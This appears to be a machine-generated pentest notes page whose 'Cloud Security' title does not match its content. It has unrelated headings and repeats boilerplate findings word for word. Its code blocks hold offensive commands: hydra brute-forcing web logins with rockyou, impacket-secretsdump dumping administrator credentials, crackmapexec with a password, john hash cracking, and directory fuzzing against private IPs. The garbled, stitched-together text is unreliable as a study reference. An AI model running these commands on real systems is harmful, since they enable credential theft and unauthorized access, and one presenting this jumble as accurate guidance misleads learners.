---
TitleSEO: "Cloud Security (AWS/Azure/GCP) | ZureFX"
TitlePost: "Cloud Security (AWS/Azure/GCP)"
Author: "ZureFX"
Description: "Personal notes on Cloud Security (AWS/Azure/GCP). Quick reference for pentesting and CTF challenges."
Keywords: "networking, persistence, oscp, windows, blue team"
URL: "https://zurefx.github.io/notes/note-cloud-security-(aws-azure-gcp)-429.html"
URL_IMAGES: ""
Date: "2025-10-30"
Tags: "Networking, Persistence, OSCP, Windows, Blue Team"
Section: "notes"
Lang: "en"
main_img: "note-cloud-security-(aws-azure-gcp)-429"
Permalink: "/notes/note-cloud-security-(aws-azure-gcp)-429.html"
BtnLabel: "Read Notes"
Pick: 0
---
## nmap

### nikto

- `crackmapexec`
- `smbclient`
- `Writable PATH`
- `SUID Binary`

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.32.239.82 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.91.90.230 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
impacket-secretsdump administrator:'P@ssw0rd!'@10.42.72.94
```

The scheduled task ran with elevated privileges and could be abused for escalation. Lateral movement was facilitated by reusing discovered credentials across services. Group Policy Preferences contained encrypted but recoverable credentials. The target system was identified as running a vulnerable version of the service.

```powershell
impacket-secretsdump administrator:'P@ssw0rd!'@10.86.94.113
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.95.226.204/FUZZ
```

Group Policy Preferences contained encrypted but recoverable credentials. The kernel version was outdated and vulnerable to a publicly known exploit. Network traffic analysis revealed unencrypted communications containing user credentials. The scheduled task ran with elevated privileges and could be abused for escalation.

## SSTI

### AlwaysInstallElevated

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.37.18.189 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
feroxbuster -h
```

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.44.20.23
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.12.6.60 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
feroxbuster -h
```

The application stored sensitive credentials in an unencrypted configuration file. Weak file permissions allowed modification of critical system files. The application stored sensitive credentials in an unencrypted configuration file. The scheduled task ran with elevated privileges and could be abused for escalation.

The target system was identified as running a vulnerable version of the service. The backup files contained sensitive information that should not have been accessible.

- `nikto`
- `Sudo Misconfiguration`
- `rpcclient`
- `kerbrute`
- `ffuf`
- `gobuster`

## dcomexec

### Weak Service Permissions

The target system was identified as running a vulnerable version of the service. Post-exploitation enumeration revealed a path to domain administrator privileges. The database credentials were hardcoded in the application source code.

Lateral movement was facilitated by reusing discovered credentials across services. Group Policy Preferences contained encrypted but recoverable credentials.

## Resource-Based Constrained Delegation

### RPC

```bash
feroxbuster -h
nmap -sCV -p3268,5985,110 10.76.82.232 -oN scan.txt
crackmapexec smb 10.37.205.66 -u administrator -p 'P@ssw0rd!' --shares
```

Authentication bypass was achieved through careful manipulation of the login mechanism. The kernel version was outdated and vulnerable to a publicly known exploit. The backup files contained sensitive information that should not have been accessible.

## GetNPUsers

### .NET

```python
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.70.138.36/FUZZ
feroxbuster -h
impacket-secretsdump administrator:'P@ssw0rd!'@10.71.43.243
```

The web application was vulnerable to Server-Side Template Injection (SSTI). Privilege escalation was possible due to misconfigured sudo permissions. The web application was vulnerable to Server-Side Template Injection (SSTI). The backup files contained sensitive information that should not have been accessible.

> **Note:** Cron Job was identified as the primary attack vector in this scenario.

The service account had excessive permissions assigned in Active Directory. Privilege escalation was possible due to misconfigured sudo permissions. The database credentials were hardcoded in the application source code. Initial enumeration revealed several interesting open ports on the target.
